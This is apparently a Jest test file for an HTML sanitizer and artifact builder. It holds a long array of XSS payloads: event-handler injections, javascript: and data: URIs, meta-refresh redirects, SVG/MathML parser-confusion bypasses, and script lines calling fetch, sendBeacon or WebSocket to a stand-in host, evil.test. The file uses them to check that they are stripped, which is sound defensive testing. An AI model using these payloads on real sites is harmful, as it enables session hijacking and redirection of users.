import {
  buildTailoredCadenceArtifactHtml,
  CANONICAL_PROBE_SCRIPT,
  MAX_CADENCE_ARTIFACT_BYTES,
  sanitizeCadenceArtifactHtml,
} from '../src/index.ts';

describe('@aklapper/core (cadence artifact sanitizer & tailored builder)', () => {
  it('sanitizes unsafe HTML/JS escape hatches, preserves inner code fences, injects strict CSP, caps 48 KiB, and tailors item artifacts', () => {
    const attackVectors = [
      '<!doctype html><!-- <head> --><html><head><meta name=">" http-equiv="refresh" content="0;url=https://evil.test"></head><body>',
      '<iframe src="https://evil.test"></iframe>',
      '<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/y"><base href="https://evil.test">',
      '<div onclick="parent.postMessage(1)">item</div>',
      '<img src="x"onerror="alert(1)"onload="eval(1)"><svg/onload="location=\'https://evil.test\'"></svg>',
      '<a href="javascript:alert(1)">link</a><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data-link</a>',
      '<script title=">" src="https://evil.test/evil.js"></script ><svg><script href="https://evil.test/s.js"/></svg>',
      '<script>window.top.location="https://evil.test"; localStorage.getItem("k"); sessionStorage.clear();</script>',
      '<script>alert ("xss"); eval ("1+1"); fetch ("https://evil.test"); Function("return 1")();</script >',
      '<script>navigator.sendBeacon("https://evil.test"); new WebSocket("wss://evil.test"); location="https://evil.test";</script>',
      '<script>self["loc"+"ation"]="https://evil.test"; (0,console.log)(1); top["postMessage"](1,"*"); document["wri"+"te"]("x");</script>',
      '<script><!-- <script> </script> -->\nself["loc"+"ation"]="https://evil.test";\n</script>',
      '<script>/*</script!>*/alert(1)</script>',
      '<meta name=a"b http-equiv=refresh content=0;url=https://evil.test>',
      '<script x=a"b>console.log("odd-quote-script")</script>',
      '<iframe title=a"b src="about:blank"></iframe>',
      '<object id="obj" title=a"b data="https://evil.test/x"></object>',
      '<svg id=a"b onload=document.body.dataset.pwn=1></svg>',
      '<img src=x" onerror=alert(1)>',
      '<!-- <a " --> <img src=x alt=">" onerror=alert(1)>',
      '<!-- dash --!><img src=x onerror=alert(2)>',
      '<style>/* <a " */</style><img src=x alt=">" onerror=alert(3)>',
      '<style>@import url(https://evil.test);</style>',
      '<a href="&#100;ata:text/html;base64,PHNjcmlwdD4=">ent-data</a>',
      '<a href="data:text&#x2f;html,<script>alert(1)</script>">slash-data</a>',
      '<a href="data:application/xhtml+xml,<html/>">xhtml-data</a>',
      '<a href="java&#x09;script:alert(1)">tab-js</a>',
      '<svg><a><set attributeName="href" to="&#x6a;avascript:alert(1)"/></a><script href="https://evil.test/s.js"/><img src=x onerror=alert(4)></svg>',
      '<svg><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></svg>',
      '<svg><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></svg>',
      '<svg><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea></svg>',
      '<math><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></math>',
      '<math><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></math>',
      '<math><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea></math>',
      '<svg><title><img src=x onerror=alert(5)><a href="data:text/html,<script>1</script>">go</a></title></svg>',
      '<svg><desc><p></p></desc><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></svg>',
      '<svg><title><p></title><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></svg>',
      '<math><mtext><p></p></mtext><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></math>',
      '<math><mtext><span></mtext><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></math>',
      '<math><annotation-xml encoding="text/html"><span></annotation-xml><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></math>',
      '<svg></p><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg /><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></svg>',
      '<svg><desc></svg></desc><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg><title></svg></title><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<math><mtext></math></mtext><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<math><annotation-xml encoding="text/html"></math></annotation-xml><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg><desc><svg><title></svg></title><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg></g><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title></svg>',
      '<span><div><svg><g></span><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea>',
      '<math><mi><mglyph></span><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<math><annotation-xml encoding=" text/html "><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style></annotation-xml></math>',
      '<math><annotation-xml><svg><desc><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<math><annotation-xml encoding="image/svg+xml"><svg><title><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<style>.a{--x:"/*";background:url(data:text/html,hi);--y:"*/"}</style>',
      '<svg><style>&#x40;im<!-- -->port url(https://evil.test);</style></svg>',
      '<svg><desc><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></desc></svg>',
      '<svg><desc><title /><!-- </title><meta http-equiv="refresh" content="0;url=https://evil.test"> --></desc></svg>',
      '<svg><font color="red"><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></svg>',
      '<math><mtext><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></mtext></math>',
      '<math><mi><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></mi></math>',
      '<math><annotation-xml encoding="text/html"><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></annotation-xml></math>',
      '<math><annotation-xml encoding="application/xhtml+xml"><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> --></annotation-xml></math>',
      '<div><svg></div><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<div><svg><g></div><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg><math></svg><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg><g></div><textarea><meta http-equiv="refresh" content="0;url=https://evil.test"></textarea></svg>',
      '<svg><embed><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<svg><meta http-equiv="x" content="y"><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<span><math><annotation-xml></span><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<div><p><svg><g></div><style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<svg><desc><image></desc><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<form><svg><desc><form></desc><style><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<table><svg><desc><td></td></desc><title><!-- </title><meta http-equiv="refresh" content="0;url=https://evil.test"> --></title></table>',
      '<svg><style>/* &ast;/ @import url(https://evil.test); /* */</style></svg>',
      '<div style="/* &ast;/ background:url(data:text/html,hi) /* */">hi</div>',
      '<style>.a{--x:"\n;@import url(https://evil.test);--y:"/*"}</style>',
      '<style>--><meta http-equiv="refresh" content="0;url=https://evil.test"></style>',
      '<title><meta http-equiv="refresh" content="0;url=https://evil.test"></title>',
      '<textarea><img src=x onerror=alert(9)></textarea>',
      '<template><script>alert(1)</script></template>',
      '<style /><!-- </style><meta http-equiv="refresh" content="0;url=https://evil.test"> -->',
      '<img srcset="https://ok.test/a.png&#x20;1x&#x2c;javascript:alert(1)&#x20;2x" />',
      '<style>.x{background:url(\\64/*c*/ata:text/html,hi)}</style>',
      '<svg><style>@import url(https://evil.test);</style></svg>',
      '<link rel="preconnect" href="https://evil.test" />',
    ];

    for (const vector of attackVectors) {
      const sanitizedVector = sanitizeCadenceArtifactHtml(vector);
      expect(sanitizedVector.stripped).toBe(true);
      expect(sanitizedVector.html).not.toContain('<!--');
      expect(sanitizedVector.html).not.toContain('<svg');
      expect(sanitizedVector.html).not.toContain('<math');
      expect(sanitizedVector.html).not.toContain('<template');
      expect(sanitizedVector.html).not.toContain('<iframe');
      expect(sanitizedVector.html).not.toContain('<object');
      expect(sanitizedVector.html).not.toContain('<embed');
      expect(sanitizedVector.html).not.toContain('<base');
      expect(sanitizedVector.html).not.toContain('<link');
      expect(sanitizedVector.html).not.toContain('<set');
      expect(sanitizedVector.html).not.toContain('<style');
      expect(sanitizedVector.html).not.toContain('@import');
      expect(sanitizedVector.html).not.toContain('<meta http-equiv="refresh"');
      expect(sanitizedVector.html).not.toContain('<meta http-equiv=refresh');
      expect(sanitizedVector.html).not.toContain('<meta name=');
      expect(sanitizedVector.html).not.toMatch(/<[^>]*\bon(?:click|error|load)\s*=/i);
      expect(sanitizedVector.html).not.toContain('javascript:');
      expect(sanitizedVector.html).not.toContain('data:text/html');
      expect(sanitizedVector.html).not.toContain('data:application/xhtml+xml');
      expect(sanitizedVector.html).not.toContain('<script');
      expect(sanitizedVector.html).not.toContain('srcset=');
      expect(sanitizedVector.html).toContain('http-equiv="Content-Security-Policy"');
      expect(sanitizedVector.html).not.toContain("script-src 'unsafe-inline'");
    }

    const coalescingVectors = [
      '<<!-- -->meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<svg></svg>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<template></template>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<script>1</script>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<style>@import;</style>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<</svg>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<!x>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<a$>meta http-equiv="refresh" content="0;url=https://evil.test">',
      '<<!-- -->style>@import url(https://evil.test);</style>',
      '<<!-- -->img src=x onerror=alert(1)>',
    ];
    for (const vector of coalescingVectors) {
      const sanitizedCoalesce = sanitizeCadenceArtifactHtml(vector);
      expect(sanitizedCoalesce.stripped).toBe(true);
      expect(sanitizedCoalesce.html).toContain('&lt;');
      expect(sanitizedCoalesce.html).not.toContain('<!--');
      expect(sanitizedCoalesce.html).not.toContain('<svg');
      expect(sanitizedCoalesce.html).not.toContain('<template');
      expect(sanitizedCoalesce.html).not.toContain('<script');
      expect(sanitizedCoalesce.html).not.toContain('<style');
      expect(sanitizedCoalesce.html).not.toContain('<img');
      expect(sanitizedCoalesce.html).not.toContain('<meta http-equiv="refresh"');
    }

    const compositeRaw = [
      '```html',
      '<!doctype html><!-- <head> --><html><head><meta name=">" http-equiv="refresh" content="0;url=https://evil.test"></head><body>',
      '<div onclick="parent.postMessage(1)">item</div>',
      '<svg><g><circle /></g></svg>',
      '<math><mi>x</mi></math>',
      '<template><script>alert(1)</script></template>',
      '<script>self["loc"+"ation"]="https://evil.test";</script>',
      '<p>Safe content</p>',
      '</body></html>',
      '```',
    ].join('\n');
    const sanitized = sanitizeCadenceArtifactHtml(compositeRaw);
    expect(sanitized.stripped).toBe(true);
    expect(sanitized.html).not.toContain('```');
    expect(sanitized.html).not.toContain('<!--');
    expect(sanitized.html).not.toContain('<svg');
    expect(sanitized.html).not.toContain('<math');
    expect(sanitized.html).not.toContain('<template');
    expect(sanitized.html).not.toContain('<script');
    expect(sanitized.html).toContain("'sha256-B0vaSeHTnSWoVee69pbJTQb3o4Bao8IjCqTjjpMMNhc='");
    expect(sanitized.html).toContain('<p>Safe content</p>');
    expect(sanitized.html.indexOf('Content-Security-Policy')).toBeGreaterThan(
      sanitized.html.indexOf('<head>'),
    );

    const selfClosedAndNested = sanitizeCadenceArtifactHtml(
      '<html><body><svg /><p>After self-close</p><svg><svg></svg><img src=x onerror=alert(1)></svg></svg><math /><title><meta http-equiv="refresh" content="0;url=https://evil.test"></title><textarea><img src=x onerror=alert(2)></textarea><p>Sibling ok</p></body></html>',
    );
    expect(selfClosedAndNested.stripped).toBe(true);
    expect(selfClosedAndNested.html).not.toContain('<svg');
    expect(selfClosedAndNested.html).not.toContain('<math');
    expect(selfClosedAndNested.html).not.toContain('<img src=x onerror=');
    expect(selfClosedAndNested.html).not.toContain('<meta http-equiv="refresh"');
    expect(selfClosedAndNested.html).toContain(
      '<title>&lt;meta http-equiv="refresh" content="0;url=https://evil.test"&gt;</title>',
    );
    expect(selfClosedAndNested.html).toContain(
      '<textarea>&lt;img src=x onerror=alert(2)&gt;</textarea>',
    );
    expect(selfClosedAndNested.html).toContain('<p>After self-close</p>');
    expect(selfClosedAndNested.html).toContain('<p>Sibling ok</p>');

    const arbitraryScript = sanitizeCadenceArtifactHtml(
      '<!doctype html><html><body><script>document.getElementById("a").addEventListener("click", function () {});</script></body></html>',
    );
    expect(arbitraryScript.stripped).toBe(true);
    expect(arbitraryScript.html).not.toContain('<script');

    const lateHead = `<div>${'x'.repeat(50_000)}</div><head></head>`;
    const lateHeadSanitized = sanitizeCadenceArtifactHtml(lateHead);
    expect(lateHeadSanitized.stripped).toBe(true);
    expect(lateHeadSanitized.html.startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(
      true,
    );
    expect(new TextEncoder().encode(lateHeadSanitized.html).byteLength).toBeLessThanOrEqual(
      MAX_CADENCE_ARTIFACT_BYTES,
    );

    const innerFenceDoc = `<!doctype html><html><head><title>Fence Doc</title><style>.ok{color:#ffd300}</style></head><body><pre>\`\`\`js\nconst ok = 1;\n\`\`\`</pre><button id="ping-btn" type="button">Ping</button><strong id="probe-val" data-probe-prefix="ok">ok</strong><script>${CANONICAL_PROBE_SCRIPT}</script></body></html>`;
    const cleanInner = sanitizeCadenceArtifactHtml(innerFenceDoc);
    expect(cleanInner.stripped).toBe(false);
    expect(cleanInner.html).toContain('<pre>```js');
    expect(cleanInner.html).toContain('<title>Fence Doc</title>');
    expect(cleanInner.html).toContain('.ok{color:#ffd300}');
    expect(cleanInner.html).toContain('addEventListener');
    expect(cleanInner.html).toContain('Content-Security-Policy');
    expect(sanitizeCadenceArtifactHtml(cleanInner.html).stripped).toBe(false);

    const oversized = `<!doctype html><html><body>${'é'.repeat(30_000)}</body></html>`;
    const truncated = sanitizeCadenceArtifactHtml(oversized);
    expect(truncated.stripped).toBe(true);
    expect(new TextEncoder().encode(truncated.html).byteLength).toBeLessThanOrEqual(
      MAX_CADENCE_ARTIFACT_BYTES,
    );

    const pipelineHtml = buildTailoredCadenceArtifactHtml({
      prompt: 'Check <script>alert(1)</script> replica probes and latency budget',
      preset: {
        slug: 'chord-pipeline-monitor',
        title: 'CHORD Pipeline Latency Monitor',
        expectedKind: 'pipeline-monitor',
      },
      recalledPatterns: ['Zero-await SSE pattern'],
    });
    expect(pipelineHtml).toContain('CHORD Pipeline Latency Monitor');
    expect(pipelineHtml).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(pipelineHtml).toContain('Zero-await SSE pattern');
    expect(pipelineHtml).not.toContain('<script>alert(1)</script>');
    expect(sanitizeCadenceArtifactHtml(pipelineHtml).stripped).toBe(false);
  });
});
